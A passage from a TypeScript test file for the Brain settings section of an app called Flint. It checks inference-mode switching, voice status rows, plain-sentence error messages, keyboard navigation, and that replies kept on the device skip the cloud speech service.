          expect(text, JSON.stringify(env)).not.toMatch(/[/\\~()_:{}\[\]]|https?|FLINT_|127\.0\.0\.1|speech\.example|\.bin|tts-1|whisper-1|kokoro|ggml/);
        }
        for (const line of [p.ids.spsub!.textContent, p.ids.trsub!.textContent]) expect(line, JSON.stringify(env)).toMatch(/^[A-Z][^\n]*\.$/);
        for (const name of [p.ids.spval!.textContent, p.ids.trval!.textContent]) for (const w of name.split(' ')) expect(w[0], name).toBe(w[0]!.toUpperCase());
      }
    }
  });

  it('whisper.cpp or its model is not on this Mac: the Transcription row says nothing can be transcribed until it is', () => {
    const p = page();
    const st = status();
    for (const [what, sentence] of [
      ['model', 'Flint can’t turn speech into text until its transcription model is on this Mac.'],
      ['program', 'Flint can’t turn speech into text until its transcription program is on this Mac.'],
    ] as const) {
      const row = transcriptionRow(planVoice(readInferenceConfig({}), {}, { platform: 'darwin', home: '/home/will' }).stt, what);
      p.render({ ...st, voice: { ...st.voice!, transcription: row } });
      expect([p.ids.trrow!.hidden, p.ids.trval!.textContent, p.ids.trsub!.textContent]).toEqual([false, 'Whisper Base English', sentence]);
      // The Speech row is untouched by it.
      expect(p.ids.spval!.textContent).toBe('OpenAI');
    }
  });

  it('a status with no voice in it shows no voice rows, and a failed load clears them', async () => {
    const p = page();
    p.render({ ...status(), voice: undefined });
    expect([p.ids.sprow!.hidden, p.ids.trrow!.hidden]).toEqual([true, true]);
    p.render({ ...status(), voice: { speech: { name: 7, sentence: null }, transcription: { name: 'Whisper', sentence: '' } } });
    expect([p.ids.sprow!.hidden, p.ids.trrow!.hidden]).toEqual([true, true]);
    p.render(status());
    expect(p.ids.sprow!.hidden).toBe(false);
    p.run("brainFail('Couldn’t Load Brain','Flint isn’t answering.',true)");
    expect([p.ids.sprow!.hidden, p.ids.trrow!.hidden, p.ids.spval!.textContent, p.ids.trsub!.textContent]).toEqual([true, true, '', '']);
  });

  it('refused settings, a mode that could not be read and warnings appear under the group, each a plain sentence with a dot', () => {
    const p = page();
    // (A model in memory at another context is what the monitor calls `cold`: the state the page is really given.)
    p.render(status({ mode: 'local', modeSource: 'invalid_saved', env: { FLINT_LOCAL_TOOLS: 'nonsense', FLINT_INFERENCE_MODE: 'turbo', FLINT_LOCAL_REQUEST_TIMEOUT_MS: 'soon' }, primary: { state: 'cold', contextLength: 32768, contextMismatch: true } }));
    const notes = p.ids.brainnotes!;
    expect(notes.hidden).toBe(false);
    // The saved mode is why Flint is in Local: no second sentence says "The mode chosen here is in use." beside it.
    expect(notes.children.map((row) => row.children[1]!.textContent)).toEqual([
      'The saved mode couldn’t be read, so Flint is in Local mode, which never uses the cloud. Choose a mode to save it again.',
      'The tools setting in Flint’s setup isn’t valid, so the local model is offered no tools.',
      'A timing setting in Flint’s setup isn’t valid, so Flint uses its usual value.',
      'The local model is in memory with a context of 32,768 tokens, and Flint asks for 16,384.',
    ]);
    // ...and the row above says the same thing as the notice, never "It is not loaded."
    expect(p.ids.lmsub!.textContent).toBe('It reloads on the next local answer.');
    for (const row of notes.children) {
      expect(row.className).toBe('bnote');
      expect(row.children[0]!.className).toBe('st degraded');
      expect(row.children[1]!.textContent).not.toMatch(/FLINT_|OLLAMA_|[{}\[\]]|\//);
    }
    // An environment mode Flint does not know, with nothing saved: said too.
    p.render(status({ mode: 'local', modeSource: 'invalid_env', env: { FLINT_INFERENCE_MODE: 'turbo' } }));
    expect(notes.children.map((row) => row.children[1]!.textContent)).toEqual(['The mode Flint was started with isn’t one it knows, so Flint is in Local mode, which never uses the cloud.']);
    // Nothing to say: the list is gone, not an empty box.
    p.render(status());
    expect(notes.hidden).toBe(true);
    expect(notes.children).toEqual([]);
    // Whatever arrives there that is not a sentence is not shown.
    p.render({ ...status(), notices: [42, null, '', { a: 1 }, 'One real sentence.'] });
    expect(notes.children.map((row) => row.children[1]!.textContent)).toEqual(['One real sentence.']);
  });
});

describe('when the status cannot be loaded', () => {
  it('a designed error with Try Again, as Health has: no stale value, and no live Copy Command', async () => {
    let fail = false;
    const p = page({
      get: () => {
        if (fail) throw new TypeError('Load failed');
        return status({ primary: { state: 'unavailable', why: 'not_installed' }, standby: { state: 'unavailable', why: 'not_installed' }, env: { FLINT_LOCAL_TOOLS: 'nonsense' } });
      },
    });
    p.run('loadBrain()');
    await settle();
    expect(p.ids.lmcopy!.hidden).toBe(false);
    expect(p.ids.brainnotes!.hidden).toBe(false);
    fail = true;
    p.run('loadBrain()');
    await settle();
    // The rows are gone and one row says what happened.
    expect(p.ids.brainrows!.hidden).toBe(true);
    expect(p.ids.brainerr!.hidden).toBe(false);
    expect(p.ids.brainerrttl!.textContent).toBe('Couldn’t Load Brain');
    expect(p.ids.brainerrsub!.textContent).toBe('Flint isn’t answering.');
    expect(p.ids.brainretry!.hidden).toBe(false);
    // Nothing of the earlier answer is left behind it.
    expect([p.ids.lmval!.textContent, p.ids.sbval!.textContent, p.ids.hwval!.textContent, p.ids.lmsub!.textContent, p.ids.modesub!.textContent]).toEqual(['', '', '', '', '']);
    expect([p.ids.lmcopy!.hidden, p.ids.sbcopy!.hidden, p.ids.sbrow!.hidden, p.ids.brainnotes!.hidden]).toEqual([true, true, true, true]);
    expect(p.buttons.every((b) => !b.on && b.attrs['aria-checked'] === 'false')).toBe(true);
    expect(p.screen()).not.toMatch(/Muse|Llama|Apple/);
    // The command is gone too: pressing where the button was copies nothing.
    p.run("copyPull('main')");
    p.run("copyPull('standby')");
    await settle();
    expect(p.copied).toEqual([]);
    // Try Again: the rows come back saying Flint is checking, then the answer.
    fail = false;
    expect(section).toContain('id="brainretry" onclick="loadBrain()">Try Again</button>');
    p.run('loadBrain()');
    expect(p.ids.brainrows!.hidden).toBe(false);
    expect(p.ids.brainerr!.hidden).toBe(true);
    expect(p.ids.lmsub!.textContent).toBe('Flint is checking.');
    await settle();
    expect(p.ids.lmval!.textContent).toBe('Muse Glimmer 30B');
    expect(p.ids.lmcopy!.hidden).toBe(false);
  });

  it("Flint's own sentence is shown when it sent one; anything else is \"Flint isn't answering.\"", async () => {
    const said = async (message: string): Promise<string> => {
      const p = page({
        get: () => {
          throw new Error(message);
        },
      });
      p.run('loadBrain()');
      await settle();
      return p.ids.brainerrsub!.textContent;
    };
    expect(await said('Flint couldn’t read its status.')).toBe('Flint couldn’t read its status.');
    expect(await said('The access token was rejected. Check Settings.')).toBe('The access token was rejected. Check Settings.');
    expect(await said('Failed to fetch')).toBe('Flint isn’t answering.');
    expect(await said('NetworkError when attempting to fetch resource: http://[::1]:8080/inference')).toBe('Flint isn’t answering.');
    expect(await said('{"error":"x"}')).toBe('Flint isn’t answering.');
  });

  it('signed out: the section says so and makes no request; it does not say Flint is checking forever', async () => {
    const p = page({ token: '', get: () => status() });
    p.run('loadBrain()');
    await settle();
    expect(p.calls).toEqual([]);
    expect(p.ids.brainrows!.hidden).toBe(true);
    expect(p.ids.brainerr!.hidden).toBe(false);
    expect(p.ids.brainerrttl!.textContent).toBe('Not Signed In');
    expect(p.ids.brainerrsub!.textContent).toBe('Add your access token below to see this.');
    // Trying again cannot help without a token: no button.
    expect(p.ids.brainretry!.hidden).toBe(true);
    expect(p.screen()).not.toContain('checking');
    // The token row it points to is below it in Settings.
    expect(html.indexOf('<div class="gsh">Access</div>')).toBeGreaterThan(html.indexOf('<div class="gsh">Brain</div>'));
    // Signed in again: the section loads.
    p.run("TOKEN='tok'");
    p.run('loadBrain()');
    await settle();
    expect(p.ids.brainerr!.hidden).toBe(true);
    expect(p.ids.lmval!.textContent).toBe('Muse Glimmer 30B');
  });

  it('an answer that arrives after a newer request is not shown over it', async () => {
    const waiting: Array<(d: unknown) => void> = [];
    const p = page({ get: () => new Promise((r) => waiting.push(r)) });
    p.run('loadBrain()');
    p.run('loadBrain()');
    waiting[1]!(status({ mode: 'local' }));
    await settle();
    waiting[0]!(status({ mode: 'cloud' }));
    await settle();
    expect(p.buttons.map((b) => b.on)).toEqual([true, false, false]);
  });
});

describe('changing the mode', () => {
  it('posts the choice, then shows what the server says is in force', async () => {
    let mode: InferenceMode = 'cloud';
    const p = page({ get: () => status({ mode }), post: (b) => ((mode = (b as { mode: InferenceMode }).mode), { ok: true, mode }) });
    p.run('loadBrain()');
    await settle();
    p.run("setMode('local')");
    // While it saves, the choices cannot be pressed again.
    expect(p.buttons.every((b) => b.disabled)).toBe(true);
    await settle();
    expect(p.calls).toEqual([{ path: '/inference' }, { path: '/inference/mode', body: { mode: 'local' } }, { path: '/inference' }]);
    expect(p.buttons.map((b) => b.on)).toEqual([true, false, false]);
    expect(p.buttons.every((b) => !b.disabled)).toBe(true);
    expect(p.ids.modesub!.textContent).toBe('Every answer comes from this Mac. Flint may still search the web.');
    expect(p.ids.brainmsg!.textContent).toBe('');
  });

  it('a mode that could not be saved says so in a sentence, and the choices work again', async () => {
    const p = page({
      get: () => status({ mode: 'cloud' }),
      post: () => {
        throw new Error('Flint couldn’t save the mode.');
      },
    });
    p.run('loadBrain()');
    await settle();
    p.run("setMode('local')");
    await settle();
    expect(p.ids.brainmsg!.textContent).toBe('Flint couldn’t save the mode.');
    expect(p.buttons.every((b) => !b.disabled)).toBe(true);
    expect(p.buttons.map((b) => b.on)).toEqual([false, false, true]);
    // The mode was read again after the failure, and the sentence is still there under it.
    expect(p.calls.map((c) => c.path)).toEqual(['/inference', '/inference/mode', '/inference']);
  });

  it('a save that succeeds and a reload that fails: the choices are not left disabled, and Try Again brings them back', async () => {
    let fail = false;
    let mode: InferenceMode = 'cloud';
    const p = page({
      get: () => {
        if (fail) throw new TypeError('Load failed');
        return status({ mode });
      },
      post: (b) => {
        mode = (b as { mode: InferenceMode }).mode;
        fail = true;
        return { ok: true, mode };
      },
    });
    p.run('loadBrain()');
    await settle();
    p.run("setMode('hybrid')");
    await settle();
    // The save worked, and its own answer said the mode: the section shows it, and is NOT "Couldn't Load Brain"
    // because the look that followed failed (the review's C5).
    expect(p.ids.brainerr!.hidden).toBe(true);
    expect(p.ids.brainrows!.hidden).toBe(false);
    expect(p.buttons.map((b) => b.on)).toEqual([false, true, false]);
    expect(p.buttons.every((b) => !b.disabled)).toBe(true);
    expect(p.ids.brainmsg!.textContent).toBe('');
    // Will's own asking, with the server still not answering, is what ends in the error row.
    p.run('loadBrain()');
    await settle();
    expect(p.ids.brainerr!.hidden).toBe(false);
    fail = false;
    p.run('loadBrain()');
    await settle();
    expect(p.ids.brainerr!.hidden).toBe(true);
    expect(p.buttons.map((b) => b.on)).toEqual([false, true, false]);
    expect(p.buttons.every((b) => !b.disabled)).toBe(true);
  });

  it("the app's command surface can set it too: modeLocal, modeHybrid, modeCloud", () => {
    expect(html).toContain("else if(name==='modeLocal')setMode('local');else if(name==='modeHybrid')setMode('hybrid');else if(name==='modeCloud')setMode('cloud');}");
  });

  it('Settings loads it whenever it opens', () => {
    expect(html).toContain("function openSettings(){showPanel('settings',true);loadCreds();loadHealth();if(typeof loadBrain==='function')loadBrain();if(typeof loadAssets==='function')loadAssets();refresh();syncAccess();}");
  });
});

describe('the mode by keyboard: a radio group', () => {
  const key = (p: ReturnType<typeof page>, k: string) => {
    let prevented = false;
    (p.c as { __e: unknown }).__e = { key: k, preventDefault: () => void (prevented = true) };
    p.run('modeKey(__e)');
    return prevented;
  };

  it('one choice is in the tab order: the one in force', () => {
    const p = page();
    p.render(status({ mode: 'cloud' }));
    expect(p.buttons.map((b) => b.attrs.tabindex)).toEqual(['-1', '-1', '0']);
    p.render(status({ mode: 'local' }));
    expect(p.buttons.map((b) => b.attrs.tabindex)).toEqual(['0', '-1', '-1']);
    // A mode the page does not know: the first is reachable, none is checked.
    p.render({ ...status(), mode: 'turbo' });
    expect(p.buttons.map((b) => b.attrs.tabindex)).toEqual(['0', '-1', '-1']);
    expect(p.buttons.some((b) => b.on)).toBe(false);
  });

  it('the arrow keys, Home and End move among the three, wrapping, and change nothing on the server', () => {
    const p = page();
    p.render(status({ mode: 'hybrid' }));
    p.buttons[1]!.focus();
    expect(key(p, 'ArrowRight')).toBe(true);
    expect(p.doc.activeElement).toBe(p.buttons[2]);
    expect(p.buttons.map((b) => b.attrs.tabindex)).toEqual(['-1', '-1', '0']);
    key(p, 'ArrowDown');
    expect(p.doc.activeElement).toBe(p.buttons[0]);
    key(p, 'ArrowLeft');
    expect(p.doc.activeElement).toBe(p.buttons[2]);
    key(p, 'ArrowUp');
    expect(p.doc.activeElement).toBe(p.buttons[1]);
    key(p, 'End');
    expect(p.doc.activeElement).toBe(p.buttons[2]);
    key(p, 'Home');
    expect(p.doc.activeElement).toBe(p.buttons[0]);
    // Moving is not choosing: the mode in force is still the one checked, and nothing was posted.
    expect(p.buttons.map((b) => b.attrs['aria-checked'])).toEqual(['false', 'true', 'false']);
    expect(p.calls).toEqual([]);
  });

  it('other keys are left alone, and so are keys pressed with the focus elsewhere', () => {
    const p = page();
    p.render(status());
    p.buttons[1]!.focus();
    for (const k of ['Tab', 'a', 'Enter', ' ', 'Escape']) expect(key(p, k), k).toBe(false);
    expect(p.doc.activeElement).toBe(p.buttons[1]);
    p.doc.activeElement = null;
    expect(key(p, 'ArrowRight')).toBe(false);
  });

  it('a mode chosen from the keyboard keeps the focus on the choice once it is in force', async () => {
    let mode: InferenceMode = 'cloud';
    const p = page({ get: () => status({ mode }), post: (b) => ((mode = (b as { mode: InferenceMode }).mode), { ok: true, mode }) });
    p.run('loadBrain()');
    await settle();
    p.buttons[0]!.focus();
    const before = p.buttons[0]!.focused;
    p.run("setMode('local')");
    await settle();
    expect(p.buttons[0]!.focused).toBe(before + 1);
    // Chosen with the pointer, or from the app's commands, nothing takes the focus.
    p.doc.activeElement = null;
    p.run("setMode('hybrid')");
    await settle();
    expect(p.buttons[1]!.focused).toBe(0);
  });
});

describe('the layout rules the section relies on', () => {
  it('in a row with a dot, the sentence starts under the label, not under the dot', () => {
    expect(css).toContain('.row.stack.dot .sub{padding-left:18px;}');
    expect(section.match(/<div class="row stack dot"/g)).toHaveLength(2);
    expect(section).toMatch(/<div class="row stack dot"><span class="st unknown" id="lmdot">/);
    expect(section).toMatch(/<div class="row stack dot" id="sbrow" hidden><span class="st unknown" id="sbdot">/);
  });

  it('on a phone the three choices take a line of their own, each a 44-point target', () => {
    expect(phoneCss).toContain('#modeseg{flex:1 1 100%;display:flex;} #modeseg button{flex:1;justify-content:center;height:44px;}');
    // (Elsewhere a segmented control is 36 tall on a phone: this one is a setting, pressed with a thumb.)
    expect(phoneCss).toContain('.seg button{height:36px;}');
    expect(phoneCss.indexOf('#modeseg button')).toBeGreaterThan(phoneCss.indexOf('.seg button{height:36px;}'));
  });

  it('the notices are a list under the group, and a failed copy is announced', () => {
    expect(section).toContain('<div class="bnotes" id="brainnotes" hidden></div>');
    // The message is a live region that stays in the page: empty it takes no room, and it is never `hidden` (a
    // region that is hidden is out of the accessibility tree, and is not announced when it is shown again).
    expect(section).toContain('<div class="err bmsg" id="brainmsg" role="status" aria-live="polite"></div>');
    expect(css).toContain('.bmsg{margin-top:8px;} .bmsg:empty{margin-top:0;}');
    expect(script).not.toMatch(/brainmsg'\)\.hidden|m\.hidden=/);
    expect(css).toMatch(/\.bnote\{display:flex;align-items:flex-start;/);
  });
});

describe('the section is written for the web view the console runs in', () => {
  it('no arrow functions, let, const, template strings or dialogs', () => {
    expect(script).not.toMatch(/=>|\blet\b|\bconst\b|`|\balert\(|\bconfirm\(|\bprompt\(/);
  });

  it("the model's name and every sentence are set as text, never as HTML", () => {
    expect(script).not.toMatch(/innerHTML|insertAdjacentHTML|document\.write/);
  });

  it('a name or a sentence that is not a string is shown as nothing, never as [object Object]', () => {
    const p = page();
    p.render({ mode: 'local', modeSentence: { a: 1 }, local: { confined: true, primary: { name: ['x'], sentence: 42, state: 'loaded' }, standby: { name: null, sentence: {}, state: 'loaded' } }, hardware: { name: 7, sentence: null } });
    expect(p.screen()).not.toMatch(/object|undefined|null|42/);
    expect(p.ids.lmsub!.textContent).toBe('Flint is checking.');
  });
});

describe('the tag under a reply', () => {
  const mainJs = /<script>\n\/\* ---------- config ---------- \*\/([\s\S]*?)<\/script>/.exec(html)![1]!;
  const fnSrc = mainJs.slice(mainJs.indexOf('function setBrainChip('), mainJs.indexOf('\napplyLO();'));

  function chip(brain: string, standby?: unknown): string | undefined {
    let tag: string | undefined;
    const meta = { querySelector: () => null, appendChild: (e: { text: string }) => void (tag = e.text) };
    const c: Record<string, unknown> = { el: (_t: string, _c: string, text: string) => ({ text }) };
    createContext(c);
    runInContext(fnSrc, c);
    (c.setBrainChip as (b: unknown, brain: string, standby?: unknown) => void)({ parentNode: { querySelector: () => meta } }, brain, standby);
    return tag;
  }

  it('a cloud answer has none; a local one says Local; the standby says Standby', () => {
    expect(chip('frontier')).toBeUndefined();
    expect(chip('local')).toBe('Local');
    expect(chip('local', true)).toBe('Standby');
    // Only the server's own `standby: true` earns the tag.
    expect(chip('local', 'yes')).toBe('Local');
    expect(chip('frontier', true)).toBeUndefined();
  });

  it('the stream hands the tag what the server said about the reply', () => {
    // (A meta event that only says whether the reply stays here carries no brain: the tag is left as it is.)
    expect(mainJs).toContain("if(ev.type==='meta'){if(ev.brain)setBrainChip(body,ev.brain,ev.standby);");
  });
});

describe('a reply that stays on this Mac is spoken with this device\'s own voice: /speak is never asked for it', () => {
  // What decides that a reply stays here, and the request to /speak, are test/console-speech.test.ts's (the
  // server's `meta` event, `_speechBlob`). This runs the page's speaking chain around them.
  const mainJs = /<script>\n\/\* ---------- config ---------- \*\/([\s\S]*?)<\/script>/.exec(html)![1]!;
  const blobSrc = /^function _speechBlob\(clean,vctx\)\{.*$/m.exec(mainJs)![0];
  const fnSrc = mainJs.slice(mainJs.indexOf('function speakForVoice('), mainJs.indexOf('\nfunction toggleMic('));

  async function speak(here: boolean) {
    const neural: string[] = [];
    const local: Array<[string, boolean]> = [];
    const body = { innerHTML: '' };
    const c: Record<string, unknown> = {
      _ttsChain: Promise.resolve(),
      _ttsGen: 0,
      _ttsQueued: 0,
      _ttsAudio: null,
      md: (t: string) => t,
      document: { getElementById: () => null },
      _neuralFetch: (t: string) => (neural.push(t), Promise.reject(new Error('no-tts'))),
      _localSpeak: (t: string, staysHere: boolean) => (local.push([t, staysHere]), Promise.resolve()),
    };
    createContext(c);
    runInContext(`${blobSrc}\n${fnSrc}`, c);
    const vctx = { displayed: '', gen: 0, conv: 'c1', here, turn: null };
    (c.speakSynced as (s: string, b: unknown, v: unknown) => void)('A private sentence.', body, vctx);
    await settle();
    return { neural, local, shown: body.innerHTML };
  }

  it('a reply that stays here: the device\'s own voice says it, the text still appears, and nothing is sent to the speech service', async () => {
    expect(await speak(true)).toEqual({ neural: [], local: [['A private sentence.', true]], shown: 'A private sentence.' });
  });

  it('any other reply asks the speech service first, as before', async () => {
    const r = await speak(false);
    expect(r.neural).toEqual(['A private sentence.']);
    expect(r.local).toEqual([['A private sentence.', false]]);
  });

  it('a reply starts as one that stays here, and Local Only or the route\'s own word no longer decide it: only the server\'s meta event does', () => {
    expect(mainJs).toContain("var vctx={displayed:'',gen:_ttsGen,conv:convId,here:true,turn:null};");
    expect(mainJs).not.toContain('vctx.priv');
    expect(mainJs).not.toMatch(/priv:!!LOCAL_ONLY/);
    // The one request to /speak is the one that guard is in front of.
    expect(mainJs.match(/\/speak'/g)).toHaveLength(1);
    expect(mainJs.match(/_neuralFetch\(/g)).toHaveLength(2);
  });
});

// ---------------------------------------------------------------------------
// The final review's console findings (C1, C2, C5 to C10). C3 (the speech guard) follows the goals branch's
// `staysHere` event and is tested with it.

describe('C1: a mode that could not be saved, through the page\'s own request helper and its own error sentences', () => {
  /** A page whose GET answers a real status and whose POST comes to `save`. Nothing between the section and the wire is a stand-in. */
  async function failing(save: Wire, modeAfter: InferenceMode = 'cloud') {
    let saved = false;
    const p = page({
      wire: (path) => {
        if (path === '/inference/mode') {
          saved = true;
          return save;
        }
        return { status: 200, body: status({ mode: saved ? modeAfter : 'cloud' }) };
      },
    });
    p.run('loadBrain()');
    await settle();
    p.buttons[2]!.focus();
    p.run("setMode('local')");
    await settle();
    return p;
  }

  it('whatever went wrong, the message is one plain sentence: never a browser\'s own words, a status code or a server\'s raw text', async () => {
    const raw: Array<[string, Wire]> = [
      ['the server is down (Safari, the Mac app)', { fail: 'Load failed' }],
      ['the server is down (Chrome)', { fail: 'Failed to fetch' }],
      ['the server is down (Firefox)', { fail: 'NetworkError when attempting to fetch resource.' }],
      ['an older server: 404', { status: 404, body: { error: 'not found' } }],
      ['a scoped token: 403', { status: 403, body: { error: 'this token may not call that' } }],
      ['413', { status: 413, body: { error: 'request too large' } }],
      ['a proxy\'s page: 502, not JSON', { status: 502, text: '<html>Bad Gateway</html>' }],
      ['a body the server refused: 400', { status: 400, body: { error: 'The mode is Local, Hybrid or Cloud.' } }],
    ];
    for (const [name, save] of raw) {
      const p = await failing(save);
      expect(p.ids.brainmsg!.textContent, name).toBe('Flint couldn’t save the mode.');
      expect(p.screen(), name).not.toMatch(/Load failed|Failed to fetch|NetworkError|Not found|may not call|too large|502|Bad Gateway/i);
    }
  });

  it("Flint's own sentence is shown when it sent one, and a refused token says where to fix it", async () => {
    expect((await failing({ status: 500, body: { error: 'Flint couldn’t save the mode.' } })).ids.brainmsg!.textContent).toBe('Flint couldn’t save the mode.');
    expect((await failing({ status: 500, body: { error: 'Flint couldn’t change the mode.', ref: 'ab12' } })).ids.brainmsg!.textContent).toBe('Flint couldn’t change the mode.');
    expect((await failing({ status: 401, body: { error: 'unauthorized' } })).ids.brainmsg!.textContent).toBe('The access token was rejected. Check Settings.');
  });

  it('then the mode is read again: the choices work, show what the server says, and the sentence stays under them', async () => {
    const p = await failing({ fail: 'Load failed' });
    expect(p.calls.map((c) => c.path)).toEqual(['/inference', '/inference/mode', '/inference']);
    expect(p.buttons.every((b) => !b.disabled)).toBe(true);
    expect(p.buttons.map((b) => b.on)).toEqual([false, false, true]);
    expect(p.ids.brainmsg!.textContent).toBe('Flint couldn’t save the mode.');
    expect(p.ids.brainerr!.hidden).toBe(true);
  });

  it('a save that landed although its answer was lost: the control shows the mode the server is really in, and nothing says it failed', async () => {
    const p = await failing({ fail: 'Load failed' }, 'local');
    expect(p.buttons.map((b) => b.on)).toEqual([true, false, false]);
    expect(p.buttons.map((b) => b.attrs['aria-checked'])).toEqual(['true', 'false', 'false']);
    expect(p.ids.modesub!.textContent).toBe('Every answer comes from this Mac. Flint may still search the web.');
    // The server is in the mode that was asked for: it was saved, so the sentence that said otherwise is gone.
    expect(p.ids.brainmsg!.textContent).toBe('');
    // Had the server been in ANOTHER mode than the one asked for, the sentence would stand.
    const other = await failing({ fail: 'Load failed' }, 'hybrid');
    expect(other.buttons.map((b) => b.on)).toEqual([false, true, false]);
    expect(other.ids.brainmsg!.textContent).toBe('Flint couldn’t save the mode.');
  });

  it('keyboard focus is not lost with the failure: it is back on a choice', async () => {
    const p = await failing({ fail: 'Load failed' });
    expect(p.doc.activeElement).toBe(p.buttons[2]);
    // ...and when the look after the failure fails too, the choices are enabled again and focus is still on one.
    let n = 0;
    const q = page({ wire: (path) => (path === '/inference/mode' || ++n > 1 ? { fail: 'Load failed' } : { status: 200, body: status({ mode: 'cloud' }) }) });
    q.run('loadBrain()');
    await settle();
    q.buttons[2]!.focus();
    const before = q.buttons[2]!.focused;
    q.run("setMode('local')");
    await settle();
    expect(q.buttons.every((b) => !b.disabled)).toBe(true);
    expect(q.buttons[2]!.focused).toBe(before + 1);
    expect(q.ids.brainerr!.hidden).toBe(true);
    expect(q.ids.brainmsg!.textContent).toBe('Flint couldn’t save the mode.');
  });
});

describe('C5: a saved mode is shown at once, from the save\'s own answer', () => {
  it('the choice, its sentence and the Local Only row change before the status is read again', async () => {
    let answer!: (d: unknown) => void;
    let first = true;
    const p = page({
      get: () => (first ? ((first = false), status({ mode: 'cloud' })) : new Promise((r) => (answer = r))),
      post: () => ({ ok: true, mode: 'local', previous: 'cloud', source: 'settings', modeSentence: 'Every answer comes from this Mac. Flint may still search the web.', localOnlySentence: 'Local mode keeps every answer on this Mac.' }),
    });
    p.run('loadBrain()');
    await settle();
    p.run("setMode('local')");
    await settle();
    // The second GET has not answered yet.
    expect(p.calls.map((c) => c.path)).toEqual(['/inference', '/inference/mode', '/inference']);
    expect(p.buttons.map((b) => b.on)).toEqual([true, false, false]);
    expect(p.buttons.every((b) => !b.disabled)).toBe(true);
    expect(p.ids.modesub!.textContent).toBe('Every answer comes from this Mac. Flint may still search the web.');
    expect(p.ids.losub!.textContent).toBe('Local mode keeps every answer on this Mac.');
    expect(p.ids.lotoggle!.attrs['aria-checked']).toBe('true');
    // The rest of the section follows when the status arrives.
    answer(status({ mode: 'local', primary: { state: 'loading' } }));
    await settle();
    expect(p.ids.lmsub!.textContent).toBe('It is loading now.');
  });

  it('an answer with no mode in it changes nothing by itself: the status that follows decides', async () => {
    let mode: InferenceMode = 'cloud';
    const p = page({ get: () => status({ mode }), post: () => ((mode = 'hybrid'), {}) });
    p.run('loadBrain()');
    await settle();
    p.run("setMode('hybrid')");
    await settle();
    expect(p.buttons.map((b) => b.on)).toEqual([false, true, false]);
  });

  it('the server sends the two sentences with the mode it saved', async () => {
    const routes = readFileSync(join(__dirname, '..', 'src', 'inference-routes.ts'), 'utf8');
    expect(routes).toContain('return reply(res, 200, { ok: true, mode, previous, source: deps.mode.source(), ...(deps.sentences ? deps.sentences() : {}) });');
    expect(readFileSync(join(__dirname, '..', 'src', 'index.ts'), 'utf8')).toContain('sentences: () => ctx.inference.sentences(),');
  });
});

describe('C2: in Local mode the Local Only switch is on, and not Will\'s to change there', () => {
  it('Local mode: on, locked, with a sentence that says why; his own choice is left as it was', () => {
    const p = page();
    p.render(status({ mode: 'hybrid' }));
    expect(p.ids.lotoggle!.attrs['aria-checked']).toBe('false');
    expect(p.ids.lotoggle!.attrs['aria-disabled']).toBeUndefined();
    expect(p.ids.losub!.textContent).toBe('Answers stay on this Mac.');
    p.render(status({ mode: 'local' }));
    expect(p.ids.lotoggle!.attrs['aria-checked']).toBe('true');
    expect(p.ids.lotoggle!.attrs['aria-disabled']).toBe('true');
    expect(p.ids.losub!.textContent).toBe('Local mode keeps every answer on this Mac.');
    expect(p.run('LOCAL_ONLY')).toBe(false); // the stored choice: untouched
    // A press, the shortcut and the app's menu command all land on toggleLO, which changes nothing here.
    p.run('toggleLO()');
    expect(p.run('LOCAL_ONLY')).toBe(false);
    expect(p.ids.lotoggle!.attrs['aria-checked']).toBe('true');
    expect(p.stored.flint_lo).toBe('0');
    // Out of Local mode: the switch is what he left it, and works again.
    p.render(status({ mode: 'cloud' }));
    expect(p.ids.lotoggle!.attrs['aria-checked']).toBe('false');
    expect(p.ids.lotoggle!.attrs['aria-disabled']).toBeUndefined();
    expect(p.ids.losub!.textContent).toBe('Answers stay on this Mac.');
    p.run('toggleLO()');
    expect(p.run('LOCAL_ONLY')).toBe(true);
    expect(p.ids.lotoggle!.attrs['aria-checked']).toBe('true');
    expect(p.ids.lopill!.hidden).toBe(false);
  });

  it('a choice he had made is kept through Local mode, and the pill that offers to turn it off is not shown there', () => {
    const p = page();
    p.render(status({ mode: 'cloud' }));
    p.run('toggleLO()');
    expect(p.ids.lopill!.hidden).toBe(false);
    p.render(status({ mode: 'local' }));
    expect(p.ids.lopill!.hidden).toBe(true); // "Turn Off" is not something the pill can do in Local mode
    expect(p.ids.lotoggle!.attrs['aria-checked']).toBe('true');
    p.run('toggleLO()');
    expect(p.run('LOCAL_ONLY')).toBe(true);
    p.render(status({ mode: 'hybrid' }));
    expect(p.run('LOCAL_ONLY')).toBe(true);
    expect(p.ids.lopill!.hidden).toBe(false);
    expect(p.ids.lotoggle!.attrs['aria-disabled']).toBeUndefined();
  });

  it('the mode is known without Settings ever being opened: /health says it, and the row and the attachment note follow', () => {
    const p = page();
    p.run("setLocalMode('local')");
    expect(p.ids.lotoggle!.attrs['aria-disabled']).toBe('true');
    expect(p.ids.losub!.textContent).toBe('Local mode keeps every answer on this Mac.');
    p.run("setLocalMode('cloud')");
    expect(p.ids.lotoggle!.attrs['aria-disabled']).toBeUndefined();
    expect(p.ids.losub!.textContent).toBe('Answers stay on this Mac.');
    // Not a mode at all (an older server's /health): nothing changes.
    p.run("setLocalMode('local')");
    p.run('setLocalMode(undefined)');
    expect(p.ids.lotoggle!.attrs['aria-disabled']).toBe('true');
    // Where the page reads /health, and what it tells Will when a file cannot be read in that mode.
    expect(mainScript).toContain("if(h&&typeof setLocalMode==='function')setLocalMode(h.mode);");
    expect(mainScript).toContain("if(blind)attNote(LOCAL_MODE?'Flint is in Local mode, so it can’t read '+blind+'.':'Local Only is on, so Flint can’t read '+blind+'.');");
    expect(mainScript).toContain('function toggleLO(){if(LOCAL_MODE)return;');
  });

  // Pictures and PDFs for the local model (FLINT_LOCAL_VISION, FLINT_LOCAL_PDF; both off unless set). The note under
  // an attached file says what a turn kept on this Mac cannot read. /health says what the local model reads, and
  // only when one of the two is on: with neither, the note is the sentence it always was.
  it('the note under an attached file: both kinds as ever with nothing turned on, and only what the local model cannot read when the server says it reads some', () => {
    const js = mainScript.slice(mainScript.indexOf('var LOCAL_READS={images:false,pdfs:false};'), mainScript.indexOf('function chipHtml('));
    expect(js).toContain('function attBlind(){');
    const blind = (o: { localOnly?: boolean; localMode?: boolean; files: string[]; reads?: { images?: boolean; pdfs?: boolean } }): string => {
      const c: Record<string, unknown> = { LOCAL_ONLY: o.localOnly === true, LOCAL_MODE: o.localMode === true, PENDING: o.files.map((kind) => ({ kind })) };
      createContext(c);
      runInContext(js, c);
      if (o.reads) runInContext(`LOCAL_READS=${JSON.stringify({ images: o.reads.images === true, pdfs: o.reads.pdfs === true })};`, c);
      return runInContext('attBlind()', c) as string;
    };
